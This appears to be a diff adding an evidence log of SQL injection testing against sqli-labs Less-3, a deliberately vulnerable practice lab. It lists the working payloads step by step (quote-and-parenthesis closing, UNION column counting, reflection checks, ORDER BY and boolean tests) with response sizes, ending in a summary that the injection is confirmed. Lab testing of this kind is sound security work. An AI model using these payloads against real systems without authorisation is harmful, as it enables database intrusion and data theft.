@@ -1,0 +1,56 @@
+=== Less-3 SQL Injection Validation Evidence ===
+Target: http://154.8.192.137:60000/sqli-labs/Less-3/
+Timestamp: 2026-05-22T09:XX:XX
+
+=== BASELINE TEST ===
+Request: GET /sqli-labs/Less-3/?id=1
+Result: HTTP 200, Content-Length: 726 bytes
+
+=== SINGLE QUOTE INJECTION TEST ===
+Request: GET /sqli-labs/Less-3/?id=1'
+Result: HTTP 200, Content-Length: 836 bytes
+Observation: SQL syntax error in response confirms injection triggers backend error
+
+=== CLOSING PATTERN DISCOVERY ===
+Test: id=1') -- Result: HTTP 200, len=833, error present
+Test: id=1')) -- Result: HTTP 200, len=834, error present
+Test: id=1')-- - -- Result: HTTP 200, len=726, normal response (matches baseline)
+Conclusion: Closing pattern is ') (single quote followed by closing parenthesis)
+Query structure: id=('$id') -- bracketed string parameter
+
+=== UNION COLUMN COUNT DETECTION ===
+Test: id=1') UNION SELECT NULL-- - -- Result: error (736 bytes)
+Test: id=1') UNION SELECT NULL,NULL-- - -- Result: error (736 bytes)
+Test: id=1') UNION SELECT NULL,NULL,NULL-- - -- Result: success (726 bytes), reflection present
+Test: id=1') UNION SELECT NULL,NULL,NULL,NULL-- - -- Result: error (736 bytes)
+Conclusion: 3 columns required for UNION
+
+=== UNION REFLECTION VERIFICATION ===
+Test: id=-1') UNION SELECT 1,'INJECT_TEST_COL2','INJECT_TEST_COL3'-- -
+Result: HTTP 200, 750 bytes
+Observation: Both "INJECT_TEST_COL2" and "INJECT_TEST_COL3" appear in response
+Output Format: Data reflected in Login/Password fields
+
+=== ORDER BY COLUMN CONFIRMATION ===
+Test: id=1') ORDER BY 3-- - -- Result: HTTP 200, 726 bytes (success)
+Test: id=1') ORDER BY 4-- - -- Result: HTTP 200, 711 bytes, error=True
+Conclusion: 3 columns confirmed via ORDER BY method
+
+=== BOOLEAN DIFFERENTIAL TEST ===
+Test: id=1') OR '1'='1'-- - -- Result: HTTP 200, 726 bytes (true condition)
+Test: id=1') AND '1'='2'-- - -- Result: HTTP 200, 675 bytes (false condition)
+Differential: 51 bytes between true/false conditions
+Note: Smaller differential than expected but confirms boolean logic works
+
+=== COMMENT NEUTRALIZATION TEST ===
+Test: id=1')-- - -- Result: HTTP 200, 726 bytes (matches baseline)
+Conclusion: SQL comment syntax (-- -) successfully neutralizes trailing query fragment
+
+=== SUMMARY ===
+VULNERABILITY: SQL Injection (Error-based + UNION-based)
+CLOSE_PATTERN: ') 
+QUERY_STRUCTURE: id=('$id')
+COLUMNS: 3
+REFLECTED_COLUMNS: 2, 3 (Login name, Password fields)
+COMMENT_WORKS: True
+CAPABILITY: sql_injection verified on Less-3
